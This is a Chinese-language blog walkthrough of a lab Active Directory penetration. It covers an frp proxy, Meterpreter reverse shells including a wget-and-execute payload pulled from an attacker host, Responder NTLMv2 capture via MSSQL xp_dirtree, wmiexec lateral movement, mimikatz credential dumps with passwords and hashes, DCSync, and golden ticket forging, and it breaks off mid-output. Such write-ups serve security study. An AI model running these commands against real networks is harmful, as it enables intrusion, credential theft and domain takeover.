+<h3 id="代理和C2"><a href="#代理和C2" class="headerlink" title="代理和C2"></a>代理和C2</h3><h4 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">frpc.ini</span><br><span class="line">[common]</span><br><span class="line">server_addr = 192.168.0.57</span><br><span class="line">server_port = 7000</span><br><span class="line"></span><br><span class="line">[plugin_socks]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 6001</span><br><span class="line">plugin = socks5</span><br><span class="line"></span><br><span class="line">/etc/proxychains4.conf</span><br><span class="line">socks5 192.168.0.57 6001</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="上线meterpreter"><a href="#上线meterpreter" class="headerlink" title="上线meterpreter"></a>上线meterpreter</h4><h5 id="1-msfvenom"><a href="#1-msfvenom" class="headerlink" title="1.msfvenom"></a>1.msfvenom</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.0.57 lport=6000 -f elf -o payload</span><br><span class="line"></span><br><span class="line">$ sudo msfconsole -q</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; search meterpreter linux 64 type:payload</span><br><span class="line">29  payload/linux/x64/meterpreter_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.0.57</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 6000</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: firefart</span><br><span class="line">meterpreter &gt; run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="2-web-delivery"><a href="#2-web-delivery" class="headerlink" title="2.web_delivery"></a>2.web_delivery</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/script/web_delivery</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; set target Linux</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; set LHOST 192.168.0.57</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; set LPORT 5555</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; exploit</span><br><span class="line">wget -qO PQTgJbzw --no-check-certificate http://192.168.0.57:8080/NKhDx25LaamO1ac; chmod +x PQTgJbzw; ./PQTgJbzw&amp; disown</span><br><span class="line"></span><br><span class="line">靶机上执行wget -qO PQTgJbzw --no-check-certificate http://192.168.0.57:8080/NKhDx25LaamO1ac; chmod +x PQTgJbzw; ./PQTgJbzw&amp; disown</span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; sessions</span><br><span class="line">2         meterpreter x64/linux  firefart @ localhost.localdomain  192.168.0.57:5555 -&gt; 192.168.0.25:48142 (192.168.0.25)</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; sessions 2</span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: firefart</span><br><span class="line">meterpreter &gt; run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="收集192-168-93-1-x2F-24信息"><a href="#收集192-168-93-1-x2F-24信息" class="headerlink" title="收集192.168.93.1&#x2F;24信息"></a>收集192.168.93.1&#x2F;24信息</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># ./fscan -h 192.168.93.1/24</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 192.168.93.100  is alive</span><br><span class="line">(icmp) Target 192.168.93.120  is alive</span><br><span class="line"></span><br><span class="line">(icmp) Target 192.168.93.20   is alive</span><br><span class="line">(icmp) Target 192.168.93.10   is alive</span><br><span class="line">(icmp) Target 192.168.93.30   is alive</span><br><span class="line"></span><br><span class="line">192.168.93.120:22 open</span><br><span class="line">192.168.93.20:80 open</span><br><span class="line">192.168.93.120:80 open</span><br><span class="line">192.168.93.100:80 open</span><br><span class="line">192.168.93.100:22 open</span><br><span class="line">192.168.93.20:1433 open</span><br><span class="line">192.168.93.30:445 open</span><br><span class="line">192.168.93.10:445 open</span><br><span class="line">192.168.93.20:445 open</span><br><span class="line">192.168.93.30:139 open</span><br><span class="line">192.168.93.10:139 open</span><br><span class="line">192.168.93.20:139 open</span><br><span class="line">192.168.93.30:135 open</span><br><span class="line">192.168.93.10:135 open</span><br><span class="line">192.168.93.20:135 open</span><br><span class="line">192.168.93.10:88 open</span><br><span class="line">[+] mysql 192.168.93.120:3306:root 123</span><br><span class="line">[+] mysql 192.168.93.100:3306:root 123</span><br><span class="line"></span><br><span class="line">WIN-8GA56TNV3MV</span><br><span class="line">[*]192.168.93.10  [+] DC:WIN-8GA56TNV3MV.test.org      Windows Server 2012 R2 Datacenter 9600</span><br><span class="line"></span><br><span class="line">win7</span><br><span class="line">[*]192.168.93.30  (Windows 7 Professional 7601 Service Pack 1)</span><br><span class="line"></span><br><span class="line">win2008</span><br><span class="line">[*]192.168.93.20  win2008.test.org      Windows Server (R) 2008 Datacenter 6003 Service Pack 2</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="捕获NTLMv2并利用"><a href="#捕获NTLMv2并利用" class="headerlink" title="捕获NTLMv2并利用"></a>捕获NTLMv2并利用</h3><h4 id="安装Responder"><a href="#安装Responder" class="headerlink" title="安装Responder"></a>安装Responder</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 首先需要修改时间为当前时间，不然安装openssl会报错（可能）</span><br><span class="line">date -s &quot;20240711 09:22:30&quot; &amp;&amp;hwclock --systohc</span><br><span class="line"></span><br><span class="line"># 下载依赖的安装包</span><br><span class="line">wget https://www.sqlite.org/2022/sqlite-autoconf-3390400.tar.gz --no-check-certificate</span><br><span class="line">wget https://www.openssl.org/source/openssl-1.1.1g.tar.gz --no-check-certificate</span><br><span class="line">wget https://jaist.dl.sourceforge.net/project/libpng/zlib/1.2.11/zlib-1.2.11.tar.gz --no-check-certificate</span><br><span class="line">wget https://www.python.org/ftp/python/3.6.9/Python-3.6.9.tgz </span><br><span class="line">wget https://codeload.github.com/lgandx/Responder/zip/refs/heads/master</span><br><span class="line"></span><br><span class="line"># 传入zlib、openssl、sqlite3、Python3、Responder的安装包</span><br><span class="line">gunzip Python-3.6.9.tgz &amp;&amp; tar -xvf Python-3.6.9.tar &amp;&amp; cd Python-3.6.9 &amp;&amp; LD_RUN_PATH=/usr/local/sqlite3/lib &amp;&amp; export LDFLAGS=&quot;-L/usr/local/sqlite3/lib -L/usr/local/openssl/lib&quot; &amp;&amp; export CPPFLAGS=&quot;-I /usr/local/sqlite3/include -I /usr/local/openssl/include&quot; &amp;&amp; export PKG_CONFIG_PATH=&quot;/usr/local/openssl/lib/pkgconfig&quot; &amp;&amp; chmod u+x configure &amp;&amp; ./configure --prefix=/usr/local/python3.6 --enable-shared CFLAGS=-fPIC --with-openssl=/usr/local/openssl &amp;&amp; chmod u+x Modules/_ctypes/libffi/configure &amp;&amp; make &amp;&amp; make install &amp;&amp; sh -c &quot;echo &#x27;/usr/local/python3.7/lib&#x27; &gt;&gt; /etc/ld.so.conf&quot; &amp;&amp; cp /usr/local/python3.6/bin/python3.6 /usr/bin/ &amp;&amp; update-alternatives --install /usr/bin/python3 python3 /usr/bin/python3.6 1 &amp;&amp; cp /usr/local/python3.6/bin/pip3 /usr/bin &amp;&amp; update-alternatives --install /usr/bin/pip3 pip3 /usr/bin/pip3 1 &amp;&amp; echo &#x27;/usr/local/python3.6/lib&#x27; &gt; /etc/ld.so.conf.d/python3.conf &amp;&amp; ldconfig &amp;&amp; cd ..</span><br><span class="line"></span><br><span class="line"># 安装Responder</span><br><span class="line">unzip Responder-master.zip &amp;&amp; cd Responder-master &amp;&amp; pip3 install -r requirements.txt</span><br><span class="line"></span><br><span class="line"># 运行</span><br><span class="line">python3 Responder.py -I eth1 -Pv</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="MSSQL-xp-dirtree读文件进行NTLM窃取"><a href="#MSSQL-xp-dirtree读文件进行NTLM窃取" class="headerlink" title="MSSQL xp_dirtree读文件进行NTLM窃取"></a>MSSQL xp_dirtree读文件进行NTLM窃取</h4><p>猜测MySQL的用户名口令在MSSQL复用。</p>
+<p>登录MSSQL，执行SQL语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC master.sys.xp_dirtree &quot;\\192.168.93.100\aaa&quot;,0,1</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 msfconsole -q</span><br><span class="line">msf6 &gt; use auxiliary/admin/mssql/mssql_ntlm_stealer</span><br><span class="line">msf6 auxiliary(admin/mssql/mssql_ntlm_stealer) &gt; set USERNAME testuser</span><br><span class="line">msf6 auxiliary(admin/mssql/mssql_ntlm_stealer) &gt; set PASSWORD cvcvgjASD!@</span><br><span class="line">msf6 auxiliary(admin/mssql/mssql_ntlm_stealer) &gt; set RHOSTS 192.168.93.20</span><br><span class="line">msf6 auxiliary(admin/mssql/mssql_ntlm_stealer) &gt; set SMBPROXY 192.168.93.100</span><br><span class="line">msf6 auxiliary(admin/mssql/mssql_ntlm_stealer) &gt; run</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Responder中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[MSSQL] Received connection from 192.168.93.20</span><br><span class="line">[SMB] NTLMv2-SSP Client   : 192.168.93.20</span><br><span class="line">[SMB] NTLMv2-SSP Username : WIN2008\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::WIN2008:502dc9636bd60fee:711B854597D615FCE9DF048EF4043EA6:0101000000000000D101714379D3DA0126F84B5900E8C09200000000020008004E004B003200520001001E00570049004E002D004600370050004C0030004300300051004D005A00430004003400570049004E002D004600370050004C0030004300300051004D005A0043002E004E004B00320052002E004C004F00430041004C00030014004E004B00320052002E004C004F00430041004C00050014004E004B00320052002E004C004F00430041004C00080030003000000000000000000000000030000011C4314A8F10C5B6E59317CE9DBBCF8859B4494BEA8E251FCE09E150BA4F27F40000000000000000</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="NTLMv2传递（未成功）"><a href="#NTLMv2传递（未成功）" class="headerlink" title="NTLMv2传递（未成功）"></a>NTLMv2传递（未成功）</h4><p>需要俩机器hash一致。环境中俩机器的win7和win2008的本地administrator密码相同</p>
+<p>判断哪个机器未进行SMB签名，Responder的&#x2F;tools目录中：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[firefart@localhost tools]# python3 RunFinger.py -i 192.168.93.1/24</span><br><span class="line">[SMB2]:[&#x27;192.168.93.30&#x27;, Os:&#x27;Windows 7/Server 2008R2&#x27;, Build:&#x27;7601&#x27;, Domain:&#x27;TEST&#x27;, Bootime: &#x27;2019-10-30 11:02:57&#x27;, Signing:&#x27;False&#x27;, RDP:&#x27;False&#x27;, SMB1:&#x27;True&#x27;, MSSQL:&#x27;False&#x27;]</span><br><span class="line">[SMB2]:[&#x27;192.168.93.20&#x27;, Os:&#x27;Windows Vista/Server 2008&#x27;, Build:&#x27;6003&#x27;, Domain:&#x27;TEST&#x27;, Bootime: &#x27;2019-12-14 06:49:34&#x27;, Signing:&#x27;False&#x27;, RDP:&#x27;False&#x27;, SMB1:&#x27;True&#x27;, MSSQL:&#x27;True&#x27;]</span><br><span class="line">[SMB1]:[&#x27;192.168.93.30&#x27;, Os:&#x27;Windows 7 Professional 7601 Service Pack 1&#x27;, Domain:&#x27;TEST&#x27;, Signing:&#x27;False&#x27;, Null Session: &#x27;True&#x27;, RDP:&#x27;False&#x27;, MSSQL:&#x27;False&#x27;]</span><br><span class="line">[SMB1]:[&#x27;192.168.93.20&#x27;, Os:&#x27;Windows Server (R) 2008 Datacenter 6003 Service Pack 2&#x27;, Domain:&#x27;TEST&#x27;, Signing:&#x27;False&#x27;, Null Session: &#x27;True&#x27;, RDP:&#x27;False&#x27;, MSSQL:&#x27;True&#x27;]</span><br><span class="line">[SMB2]:[&#x27;192.168.93.10&#x27;, Os:&#x27;Windows 8.1/Server 2012R2&#x27;, Build:&#x27;9600&#x27;, Domain:&#x27;TEST&#x27;, Bootime: &#x27;2024-07-12 04:16:05&#x27;, Signing:&#x27;True&#x27;, RDP:&#x27;False&#x27;, SMB1:&#x27;True&#x27;, MSSQL:&#x27;False&#x27;]</span><br><span class="line">[SMB1]:[&#x27;192.168.93.10&#x27;, Os:&#x27;Windows Server 2012 R2 Datacenter 9600&#x27;, Domain:&#x27;TEST&#x27;, Signing:&#x27;False&#x27;, Null Session: &#x27;False&#x27;, RDP:&#x27;False&#x27;, MSSQL:&#x27;False&#x27;]</span><br></pre></td></tr></table></figure>
+
+<p>（貌似需要Signing:’False’、Null Session: ‘True’、MSSQL:’False’）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">安装MultiRelay.py的依赖</span><br><span class="line">pip3 install pycryptodome -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip3 install six -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line">pip3 install pycryptodomex -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line">编译出问题，可从kali里面Responder的Runas.exe、Syssvc.exe拷贝至目标机器/usr/share/responder/tools/MultiRelay/bin/</span><br><span class="line"></span><br><span class="line"># python3 Responder.py -I eth1</span><br><span class="line"># python3 MultiRelay.py -t 192.168.93.30 -u ALL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Relay failed, STATUS_TRUSTED_RELATIONSHIP_FAILURE returned. Credentials are good, but user is probably not using the target domain name in his credentials.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">改配置文件：</span><br><span class="line">SMB      = Off</span><br><span class="line">HTTP     = Off</span><br><span class="line">仍未成功</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="破解hash（未成功）"><a href="#破解hash（未成功）" class="headerlink" title="破解hash（未成功）"></a>破解hash（未成功）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ hashid ntlmv2</span><br><span class="line">[+] NetNTLMv2</span><br><span class="line">$ echo &quot;Administrator::WIN2008:502dc9636bd60fee:711B854597D615FCE9DF048EF4043EA6:0101000000000000D101714379D3DA0126F84B5900E8C09200000000020008004E004B003200520001001E00570049004E002D004600370050004C0030004300300051004D005A00430004003400570049004E002D004600370050004C0030004300300051004D005A0043002E004E004B00320052002E004C004F00430041004C00030014004E004B00320052002E004C004F00430041004C00050014004E004B00320052002E004C004F00430041004C00080030003000000000000000000000000030000011C4314A8F10C5B6E59317CE9DBBCF8859B4494BEA8E251FCE09E150BA4F27F40000000000000000&quot; &gt; ntlmv2</span><br><span class="line">hashcat -m 5600 -a 0 ntlmv2 word.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="放弃：123qwe-ASD"><a href="#放弃：123qwe-ASD" class="headerlink" title="放弃：123qwe!ASD"></a>放弃：123qwe!ASD</h4><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 python wmiexec.py -debug &#x27;administrator:123qwe!ASD@192.168.93.20&#x27;</span><br><span class="line">C:\&gt;ipconfig</span><br><span class="line">192.168.93.20</span><br><span class="line"></span><br><span class="line">开启远程桌面</span><br><span class="line">C:\&gt;netstat -an | find &quot;3389&quot;</span><br><span class="line">C:\&gt;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line"></span><br><span class="line">$ proxychains4 rdesktop 192.168.93.20</span><br><span class="line">登录非域用户administrator 123qwe!ASD</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h3 id="收集192-168-93-20信息"><a href="#收集192-168-93-20信息" class="headerlink" title="收集192.168.93.20信息"></a>收集192.168.93.20信息</h3><h4 id="定位DC"><a href="#定位DC" class="headerlink" title="定位DC"></a>定位DC</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nslookup -qt=ns test.org</span><br><span class="line">192.168.93.10</span><br><span class="line"></span><br><span class="line">C:\&gt;ping test.org</span><br><span class="line">Pinging test.org [192.168.93.10]</span><br><span class="line"></span><br><span class="line">C:\&gt;ipconfig /all</span><br><span class="line">Primary Dns Suffix  . . . . . . . : test.org</span><br><span class="line">IPv4 Address. . . . . . . . . . . : 192.168.93.20</span><br><span class="line">DNS Servers . . . . . . . . . . . : 192.168.93.10</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="通过smb共享上传mimikatz获取口令"><a href="#通过smb共享上传mimikatz获取口令" class="headerlink" title="通过smb共享上传mimikatz获取口令"></a>通过smb共享上传mimikatz获取口令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 smbclient //192.168.93.20/C$ -U administrator</span><br><span class="line">smb: \&gt; put mimikatz.exe</span><br><span class="line"></span><br><span class="line">C:\&gt;mimikatz.exe &quot;privilege::debug&quot; &quot;log&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.log</span><br><span class="line">Authentication Id : 0 ; 13174272 (00000000:00c90600)</span><br><span class="line">Session           : Interactive from 2</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : TEST</span><br><span class="line">Logon Server      : WIN-8GA56TNV3MV</span><br><span class="line">Logon Time        : 2019/12/15 13:24:56</span><br><span class="line">SID               : S-1-5-21-1528753600-3951244198-520479113-500</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000002] Primary</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : TEST</span><br><span class="line">	 * LM       : fc5d63d71569f04399b419bc76e2eb34</span><br><span class="line">	 * NTLM     : 18edd0cc3227be3bf61ce198835a1d97</span><br><span class="line">	 * SHA1     : 0f058e319f079c15fe3449bbeffc086cfa4d231e</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : TEST</span><br><span class="line">	 * Password : zxcASDqw123!!</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : TEST.ORG</span><br><span class="line">	 * Password : zxcASDqw123!!</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 4192214 (00000000:003ff7d6)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : WIN2008</span><br><span class="line">Logon Server      : WIN2008</span><br><span class="line">Logon Time        : 2019/12/14 19:53:47</span><br><span class="line">SID               : S-1-5-21-3814515962-2249813874-2772841674-500</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000002] Primary</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : WIN2008</span><br><span class="line">	 * LM       : ae946ec6f4ca785b93371dee1d5ee7e6</span><br><span class="line">	 * NTLM     : 31c1794c5aa8547c87a8bcd0324b8337</span><br><span class="line">	 * SHA1     : 128c0272959b85b330090611169d07d85cb6bd0b</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : WIN2008</span><br><span class="line">	 * Password : 123qwe!ASD</span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : Administrator</span><br><span class="line">	 * Domain   : WIN2008</span><br><span class="line">	 * Password : 123qwe!ASD	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">	msv :	</span><br><span class="line">	 [00000002] Primary</span><br><span class="line">	 * Username : WIN2008$</span><br><span class="line">	 * Domain   : TEST</span><br><span class="line">	 * NTLM     : e29833e2e7f09cb91ab9998e3a8cdc48</span><br><span class="line">	 * SHA1     : c05ee9f905ce8e6eff748a01f3ff82b004d361fe</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="收集域控上敏感文件"><a href="#收集域控上敏感文件" class="headerlink" title="收集域控上敏感文件"></a>收集域控上敏感文件</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">IPC连接</span><br><span class="line">C:\&gt;net use \\192.168.93.10\admin$ zxcASDqw123!! /user:test\Administrator</span><br><span class="line">The command completed successfully.</span><br><span class="line">C:\&gt;for /r C:\ %i in (*.txt) do @echo %i</span><br><span class="line">C:\Users\Administrator\My Documents\flag.txt </span><br><span class="line">C:\&gt;type \\192.168.93.10\C$\users\administrator\Documents\flag.txt</span><br><span class="line">this is flag!</span><br><span class="line"></span><br><span class="line">或者</span><br><span class="line">$ proxychains4 python wmiexec.py -debug &#x27;administrator:zxcASDqw123!!@192.168.93.10&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="域权限维持：黄金票据"><a href="#域权限维持：黄金票据" class="headerlink" title="域权限维持：黄金票据"></a>域权限维持：黄金票据</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">$ proxychains4 smbclient //192.168.93.10/C$ -U administrator</span><br><span class="line">smb: \&gt; put mimikatz.exe</span><br><span class="line"></span><br><span class="line">$ proxychains4 python wmiexec.py -debug &#x27;administrator:zxcASDqw123!!@192.168.93.10&#x27;</span><br><span class="line">C:\&gt;mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:test.org /user:krbtgt&quot; &quot;exit&quot; &gt; logs.txt</span><br><span class="line">SAM Username         : krbtgt</span><br><span class="line">Account Type         : 30000000 ( USER_OBJECT )</span><br><span class="line">User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )</span><br><span class="line">Account expiration   : </span><br><span class="line">Password last change : 10/30/2019 10:34:51 PM</span><br><span class="line">Object Security ID   : S-1-5-21-1528753600-3951244198-520479113-502</span><br><span class="line">Object Relative ID   : 502</span><br><span class="line"></span><br><span class="line">Credentials:</span><br><span class="line">  Hash NTLM: 571bcade06358cf8ea77e8418e857355</span><br><span class="line">    ntlm- 0: 571bcade06358cf8ea77e8418e857355</span><br><span class="line">    lm  - 0: 49ba429fff886c81b10cee42c6c2c0ec</span><br><span class="line"></span><br><span class="line">C:\&gt;whoami /user</span><br><span class="line">test\administrator S-1-5-21-1528753600-3951244198-520479113-500</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">创建域用户aaa:1qaz!QAZ</span><br><span class="line">双击用户，选择Remote control，选择View the user&#x27;s session</span><br><span class="line">C:\&gt;klist purge</span><br><span class="line">C:\&gt;klist</span><br><span class="line">C:\&gt;mimikatz.exe &quot;kerberos::golden /user:aaa /domain:test.org /sid:S-1-5-21-1528753600-3951244198-520479113 /krbtgt:571bcade06358cf8ea77e8418e857355 /ticket:rere&quot; &quot;exit&quot;</span><br><span class="line">mimikatz # kerberos::ptt rere</span><br><span class="line">C:\&gt;klist</span><br><span class="line">#0&gt;     Client: aaa @ test.org</span><br><span class="line">        Server: krbtgt/test.org @ test.org</span><br><span class="line">        KerbTicket Encryption Type: RSADSI 